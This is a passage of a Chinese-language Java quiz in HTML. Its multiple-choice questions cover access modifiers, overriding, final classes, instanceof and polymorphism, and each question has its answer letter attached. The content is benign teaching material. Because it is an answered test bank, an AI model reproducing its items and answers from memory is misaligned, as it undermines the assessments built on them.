<p>B.protected</p>
<p>C.private</p>
<p>D.默认</p>
</li>
<li><p>哪种访问权限修饰的成员，在任何包、任何类中都可以进行访问?（ ）D</p>
<p>A.private</p>
<p>B.默认</p>
<p>C.protected</p>
<p>D.public</p>
</li>
<li><p>在Java中，针对类和成员提供了4种访问级别，以下控制级别由小到大的顺序是：（ ）。A</p>
<p>A.private&lt; 默认 &lt; protected &lt; public</p>
<p>B.默认 &lt; private&lt; protected &lt; public</p>
<p>C.protected &lt; 默认 &lt; private &lt; public</p>
<p>D.protected &lt; private&lt; 默认 &lt; public</p>
</li>
<li><p>在成员方法的访问控制修饰符中，规定访问权限只包含该类自身作用域和同包作用域的修饰符是（ ）。C</p>
<p>A.protected</p>
<p>B.public</p>
<p>C.默认</p>
<p>D.private</p>
</li>
<li><p>构造方法中调用其他构造方法时，this(<em>,</em>,…)须放在代码的第（ ）行。B</p>
<p>A.可以不出现</p>
<p>B.1</p>
<p>C.末</p>
<p>D.无限制</p>
</li>
<li><p>某个类的方法中，在成员变量和局部变量重名的情况下，（ ）变量优先使用。</p>
<p>如果要使用（ ）变量，必须使用关键字（ ）进行限定。A</p>
<p>A.局部 成员 this</p>
<p>B.成员 局部 this</p>
<p>C.类 实例 this</p>
<p>D.实例 类 this</p>
</li>
<li><p>下列关于修饰符使用的说法，错误的是（ ）。D</p>
<p>A.abstract不能与final并列修饰同一个类</p>
<p>B.abstract类中可以有private的成员</p>
<p>C.abstract方法必须在abstract类中</p>
<p>D.static方法中能访问非static的属性</p>
</li>
<li><p>在非静态成员方法中，可以使用关键字（ ）指代当前对象，访问类的其他非静态成员。A</p>
<p>A.this</p>
<p>B.super</p>
<p>C.static</p>
<p>D.public</p>
</li>
<li><p>Java关于方法的重写，哪个说法是错误的？（ ）C</p>
<p>A.对一个方法的重写必须发生在具有继承关系的两个类中，即子类对父类方法的重写。</p>
<p>B.方法的重写在一般意义上要求：两个方法的参数个数和类型以及返回值类型都一致。</p>
<p>C.方法的重写是一个类的两个方法，方法的名称相同，但参数不同。</p>
<p>D.子类对象调用子类重写了父类的方法时，优先调用子类的方法。</p>
</li>
<li><p>已知类的继承关系如下：</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Manager</span> <span class="keyword">extends</span> <span class="title">Employee</span></span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Director</span> <span class="keyword">extends</span> <span class="title">Employee</span></span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>则下列语句通过编译的有哪些？（ ）A</p>
<p>A.Employee e&#x3D;new Manager();</p>
<p>B.Director d&#x3D; new Manager();</p>
<p>C.Director d&#x3D; new Employee();</p>
<p>D.Manager m&#x3D;new Director();</p>
</li>
<li><p>以下有关类的继承的叙述中，正确的是：（ ）。A</p>
<p>A.子类能直继承父类所有的私有属性和私有方法，但是没有访问权限</p>
<p>B.子类只能继承父类的方法，不能继承父类的属性</p>
<p>C.子类能继承父类的成员变量和变员方法，访问没有任何限制</p>
<p>D.子类不能继承父类的私有属性和私有方法</p>
</li>
<li><p>在Java中，要想让一个类继承另一个类，可以使用以下哪个关键字？（ ）C</p>
<p>A.inherits</p>
<p>B.implements</p>
<p>C.extends</p>
<p>D.modifies</p>
</li>
<li><p>如下代码，程序的输出结果将是：（ ）。D</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="built_in">int</span> a = <span class="number">11</span>;</span><br><span class="line">    <span class="built_in">int</span> b = <span class="number">12</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="keyword">print</span>() &#123;</span><br><span class="line">        System.out.println(a + <span class="string">&quot; &quot;</span> + b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_ inherited__">A</span> &#123;</span><br><span class="line">    <span class="built_in">int</span> a = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="keyword">print</span>() &#123;</span><br><span class="line">        System.out.println(a + <span class="string">&quot; &quot;</span> + b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(String[] args) &#123;</span><br><span class="line">        A aObj = <span class="keyword">new</span> A();</span><br><span class="line">        aObj.<span class="keyword">print</span>();</span><br><span class="line">        B bObj = <span class="keyword">new</span> B();</span><br><span class="line">        bObj.<span class="keyword">print</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A.</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">11 </span><span class="number">12</span></span><br><span class="line"><span class="symbol">20 </span><span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>B.</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">20 </span><span class="number">12</span></span><br><span class="line"><span class="symbol">20 </span><span class="number">12</span></span><br></pre></td></tr></table></figure>

<p>C.</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">11 </span><span class="number">12</span></span><br><span class="line"><span class="symbol">11 </span><span class="number">12</span></span><br></pre></td></tr></table></figure>

<p>D.</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">11 </span><span class="number">12</span></span><br><span class="line"><span class="symbol">20 </span><span class="number">12</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>定义一个Java类时，如果前面使用关键字（ ）修饰，它是最终类，该类不可以被继承。B</p>
<p>A.private</p>
<p>B.final</p>
<p>C.static</p>
<p>D.public</p>
</li>
<li><p>关于关键字instanceof的说法不正确的是：（ ）。C</p>
<p>A.它不能作为标识符名称出现</p>
<p>B.它用来表示某变量所指向的对象是否是另一种类型的实例</p>
<p>C.</p>
<figure class="highlight processing"><table><tr><td class="code"><pre><span class="line">Scanner sc=<span class="keyword">new </span><span class="class title_">Scanner</span>(System.<span class="property">in</span>);</span><br><span class="line"><span class="type">boolean</span> b=sc <span class="keyword">instanceof</span> <span class="built_in">String</span>;</span><br><span class="line"><span class="comment">//这种用法是正确的</span></span><br></pre></td></tr></table></figure>

<p>D.</p>
<figure class="highlight processing"><table><tr><td class="code"><pre><span class="line">Scanner sc=<span class="keyword">new </span><span class="class title_">Scanner</span>(System.<span class="property">in</span>);</span><br><span class="line"><span class="type">boolean</span> b=sc <span class="keyword">instanceof</span> <span class="built_in">Object</span>;</span><br><span class="line"><span class="comment">//这种用法是正确的</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>下面程序的输出结果为：（ ）。A</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"> <span class="type">double</span> <span class="title function_">f</span><span class="params">(<span class="type">double</span> x, <span class="type">double</span> y)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> x * y;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">A</span> &#123;</span><br><span class="line"> <span class="type">double</span> <span class="title function_">f</span><span class="params">(<span class="type">double</span> x, <span class="type">double</span> y)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> x + y;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">  <span class="type">A</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">B</span>();</span><br><span class="line">  System.out.println(obj.f(<span class="number">4</span>, <span class="number">6</span>));</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A.10.0</p>
<p>B.24.0</p>
<p>C.2.0</p>
<p>D.11.0</p>
</li>
<li><p>有如下程序代码，哪处出现编译错误？（ ）D</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="symbol">Father</span> &#123;</span><br><span class="line"> <span class="built_in">int</span> a = <span class="number">100</span>;    <span class="comment">// A</span></span><br><span class="line"> <span class="keyword">final</span> <span class="keyword">public</span> <span class="built_in">void</span> print() &#123; <span class="comment">// B</span></span><br><span class="line">  System.<span class="keyword">out</span>.println(a);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="symbol">Child</span> <span class="symbol">extends</span> <span class="symbol">Father</span> &#123; </span><br><span class="line"> <span class="built_in">int</span> a = <span class="number">200</span>;                <span class="comment">// C</span></span><br><span class="line"> <span class="keyword">public</span> <span class="built_in">void</span> print() &#123;       <span class="comment">// D</span></span><br><span class="line">  System.<span class="keyword">out</span>.println(a);  </span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A.A处</p>
<p>B.B处</p>
<p>C.C处</p>
<p>D.D处</p>
</li>
<li><p>有如下程序代码，哪处出现编译错误？（ ）B</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Father</span></span>&#123;           <span class="comment">//A</span></span><br><span class="line"> int a=<span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Child</span>  <span class="keyword">extends</span> <span class="title">Father</span></span>&#123;  <span class="comment">//B</span></span><br><span class="line">  int b=<span class="number">200</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> public <span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;              <span class="comment">//C</span></span><br><span class="line">  public static void main(<span class="type">String</span>[] args) &#123;</span><br><span class="line">   <span class="type">Child</span> child=<span class="keyword">new</span> <span class="type">Child</span>();   <span class="comment">//D  </span></span><br><span class="line"> &#125;  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>A.A处</p>
<p>B.B处</p>
<p>C.C处</p>
<p>D.D处</p>
</li>
<li><p>有如下程序代码：</p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line"><span class="title class_"><span class="keyword">class</span> <span class="title">Dog</span></span>&#123; &#125;</span><br><span class="line"><span class="title class_"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123; &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="title class_"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> void main(<span class="keyword">String</span>[] args) &#123;</span><br><span class="line">  Dog dog=<span class="keyword">new</span> <span class="type">Dog</span>();</span><br><span class="line">  Cat cat=<span class="keyword">new</span> <span class="type">Cat</span>();</span><br><span class="line">  System.out.println(cat instanceof Dog);    <span class="comment">//A</span></span><br><span class="line">  System.out.println(dog instanceof Dog);   <span class="comment">//B</span></span><br><span class="line"> &#125;  </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>关于A、B两段代码，下列哪种说法是正确的？（ ）A</p>
<p>A.输出：</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>B.输出：</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>C.输出：</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="literal">false</span></span><br><span class="line"><span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>D.出现语法编译错误，程序不能执行</p>
</li>
<li><p>在下面的代码中，若要在子child类中对父类的addvalue方法进行重写，下面对于child类中的addvalue方法的声明哪个是正确的：（ ）。A</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">father</span> </span>&#123;</span><br><span class="line"> public int addvalue(int a, int b) &#123;</span><br><span class="line">  int s = a + b;</span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">child</span> <span class="keyword">extends</span> <span class="title">father</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A.public int addvalue(int i,int j)</p>
<p>B.void addvalue(int a,int b)</p>
<p>C.void addvalue(double i)</p>
<p>D.int addvalue(int a)</p>
</li>
<li><p>有如下程序代码，编译(执行)的结果为：C</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">A</span> &#123;</span><br><span class="line"> <span class="built_in">int</span> v1 = <span class="number">10</span>;</span><br><span class="line"> <span class="built_in">int</span> v2 = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m1</span>()</span> &#123;</span><br><span class="line">  System.<span class="keyword">out</span>.println(<span class="string">&quot;A m1&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m2</span>()</span> &#123;</span><br><span class="line">  System.<span class="keyword">out</span>.println(<span class="string">&quot;A m2&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">B</span> <span class="title">extends</span> <span class="title">A</span> &#123;</span><br><span class="line"> <span class="built_in">int</span> v2 = <span class="number">20</span>;</span><br><span class="line"> <span class="built_in">int</span> v3 = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m2</span>()</span> &#123;</span><br><span class="line">  System.<span class="keyword">out</span>.println(<span class="string">&quot;B m2&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m3</span>()</span> &#123;</span><br><span class="line">  System.<span class="keyword">out</span>.println(<span class="string">&quot;B m3&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Main</span> &#123;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] args</span>)</span> &#123;</span><br><span class="line">  A a = <span class="keyword">new</span> B();</span><br><span class="line">  a.m1();</span><br><span class="line">  a.m2();</span><br><span class="line">  a.m3();</span><br><span class="line">  System.<span class="keyword">out</span>.println(a.v1);</span><br><span class="line">  System.<span class="keyword">out</span>.println(a.v2);</span><br><span class="line">  System.<span class="keyword">out</span>.println(a.v3);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A.</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">A</span> m1</span><br><span class="line"><span class="selector-tag">B</span> m2</span><br><span class="line"><span class="selector-tag">A</span> m3</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>B.</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">A</span> m1</span><br><span class="line"><span class="selector-tag">B</span> m2</span><br><span class="line"><span class="selector-tag">B</span> m3</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>C.</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">a.m3()<span class="comment">;       编译错误</span></span><br><span class="line">System.out.println(a.v3)<span class="comment">;   编译错误</span></span><br></pre></td></tr></table></figure>

<p>D.</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">a.<span class="name">m3</span><span class="comment">()</span>;       编译错误</span><br></pre></td></tr></table></figure>
</li>
<li><p>有如下代码，程序执行的结果是：（ ）。A</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">A</span> &#123;</span><br><span class="line"> <span class="built_in">int</span> v1 = <span class="number">10</span>;</span><br><span class="line"> <span class="built_in">int</span> v2 = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m1</span>()</span> &#123;</span><br><span class="line">  System.<span class="keyword">out</span>.println(<span class="string">&quot;A m1&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m2</span>()</span> &#123;</span><br><span class="line">  System.<span class="keyword">out</span>.println(<span class="string">&quot;A m2&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">B</span> <span class="title">extends</span> <span class="title">A</span> &#123;</span><br><span class="line"> <span class="built_in">int</span> v2 = <span class="number">20</span>;</span><br><span class="line"> <span class="built_in">int</span> v3 = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m2</span>()</span> &#123;</span><br><span class="line">  System.<span class="keyword">out</span>.println(<span class="string">&quot;B m2&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m3</span>()</span> &#123;</span><br><span class="line">  System.<span class="keyword">out</span>.println(<span class="string">&quot;B m3&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Main</span> &#123;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] args</span>)</span> &#123;</span><br><span class="line">  A a = <span class="keyword">new</span> B();</span><br><span class="line">  a.m1();</span><br><span class="line">  a.m2();</span><br><span class="line">  System.<span class="keyword">out</span>.println(a.v1);</span><br><span class="line">  System.<span class="keyword">out</span>.println(a.v2);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A.</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">A</span> m1</span><br><span class="line"><span class="selector-tag">B</span> m2</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>B.</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">B</span> m1</span><br><span class="line"><span class="keyword">B</span> m2</span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>C.</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">A</span> m1</span><br><span class="line"><span class="selector-tag">A</span> m2</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>D.</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">A</span> m1</span><br><span class="line"><span class="selector-tag">B</span> m2</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">20</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>有如下程序代码，程序编译(执行)的结果为：B</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">A</span> &#123;</span><br><span class="line"> <span class="built_in">int</span> v1 = <span class="number">10</span>;</span><br><span class="line"> <span class="built_in">int</span> v2 = <span class="number">10</span>;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">A</span>()</span> &#123;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m1</span>()</span> &#123;</span><br><span class="line">  System.<span class="keyword">out</span>.println(<span class="string">&quot;A m1&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m2</span>()</span> &#123;</span><br><span class="line">  System.<span class="keyword">out</span>.println(<span class="string">&quot;A m2&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">B</span> <span class="title">extends</span> <span class="title">A</span> &#123;</span><br><span class="line"> <span class="built_in">int</span> v2 = <span class="number">20</span>;</span><br><span class="line"> <span class="built_in">int</span> v3 = <span class="number">20</span>;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">B</span>()</span> &#123;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m2</span>()</span> &#123;</span><br><span class="line">  System.<span class="keyword">out</span>.println(<span class="string">&quot;B m2&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m3</span>()</span> &#123;</span><br><span class="line">  System.<span class="keyword">out</span>.println(<span class="string">&quot;B m3&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Main</span> &#123;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] args</span>)</span> &#123;</span><br><span class="line">  B b = <span class="keyword">new</span> B();</span><br><span class="line">  b.m1();</span><br><span class="line">  b.m2();</span><br><span class="line">  b.m3();</span><br><span class="line">  System.<span class="keyword">out</span>.println(b.v1);</span><br><span class="line">  System.<span class="keyword">out</span>.println(b.v2);</span><br><span class="line">  System.<span class="keyword">out</span>.println(b.v3);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A.</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">B</span> m1</span><br><span class="line"><span class="keyword">B</span> m2</span><br><span class="line"><span class="keyword">B</span> m3</span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>B.</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">A</span> m1</span><br><span class="line"><span class="selector-tag">B</span> m2</span><br><span class="line"><span class="selector-tag">B</span> m3</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>C.</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">A</span> m1</span><br><span class="line"><span class="selector-tag">B</span> m2</span><br><span class="line"><span class="selector-tag">B</span> m3</span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>D.</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">A</span> m1</span><br><span class="line"><span class="selector-tag">B</span> m2</span><br><span class="line"><span class="selector-tag">B</span> m3</span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">20</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>有如下程序代码，编译(执行)的结果为：C</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">A</span> &#123;</span><br><span class="line"> <span class="built_in">int</span> v1 = <span class="number">10</span>;</span><br><span class="line"> <span class="built_in">int</span> v2 = <span class="number">10</span>;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">A</span>()</span> &#123;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m1</span>()</span> &#123;</span><br><span class="line">  System.<span class="keyword">out</span>.println(<span class="string">&quot;A m1&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m2</span>()</span> &#123;</span><br><span class="line">  System.<span class="keyword">out</span>.println(<span class="string">&quot;A m2&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">B</span> <span class="title">extends</span> <span class="title">A</span> &#123;</span><br><span class="line"> <span class="built_in">int</span> v2 = <span class="number">20</span>;</span><br><span class="line"> <span class="built_in">int</span> v3 = <span class="number">20</span>;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">B</span>()</span> &#123;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m2</span>()</span> &#123;</span><br><span class="line">  System.<span class="keyword">out</span>.println(<span class="string">&quot;B m2&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m3</span>()</span> &#123;</span><br><span class="line">  System.<span class="keyword">out</span>.println(<span class="string">&quot;B m3&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Main</span> &#123;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] args</span>)</span> &#123;</span><br><span class="line">  A a = <span class="keyword">new</span> B();</span><br><span class="line">  a.m1();</span><br><span class="line">  a.m2();</span><br><span class="line">  a.m3();</span><br><span class="line">  System.<span class="keyword">out</span>.println(a.v1);</span><br><span class="line">  System.<span class="keyword">out</span>.println(a.v2);</span><br><span class="line">  System.<span class="keyword">out</span>.println(a.v3);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A.</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">A</span> m1</span><br><span class="line"><span class="selector-tag">B</span> m2</span><br><span class="line"><span class="selector-tag">B</span> m3</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>B.</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">A</span> m1</span><br><span class="line"><span class="selector-tag">B</span> m2</span><br><span class="line"><span class="selector-tag">B</span> m3</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>C.</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">a.m3()<span class="comment">;   编译错误</span></span><br><span class="line">System.out.println(a.v3)<span class="comment">;   编译错误</span></span><br></pre></td></tr></table></figure>

<p>D.</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">a.<span class="name">m3</span><span class="comment">()</span>;   编译错误</span><br></pre></td></tr></table></figure>
</li>
<li><p>有如下程序代码，编译(执行)的结果为：D</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">A</span> &#123;</span><br><span class="line"> <span class="built_in">int</span> v1 = <span class="number">10</span>;</span><br><span class="line"> <span class="built_in">int</span> v2 = <span class="number">10</span>;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">A</span>()</span> &#123;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m1</span>()</span> &#123;</span><br><span class="line">  System.<span class="keyword">out</span>.println(<span class="string">&quot;A m1&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m2</span>()</span> &#123;</span><br><span class="line">  System.<span class="keyword">out</span>.println(<span class="string">&quot;A m2&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">B</span> <span class="title">extends</span> <span class="title">A</span> &#123;</span><br><span class="line"> <span class="built_in">int</span> v2 = <span class="number">20</span>;</span><br><span class="line"> <span class="built_in">int</span> v3 = <span class="number">20</span>;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">B</span>()</span> &#123;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m2</span>()</span> &#123;</span><br><span class="line">  System.<span class="keyword">out</span>.println(<span class="string">&quot;B m2&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span 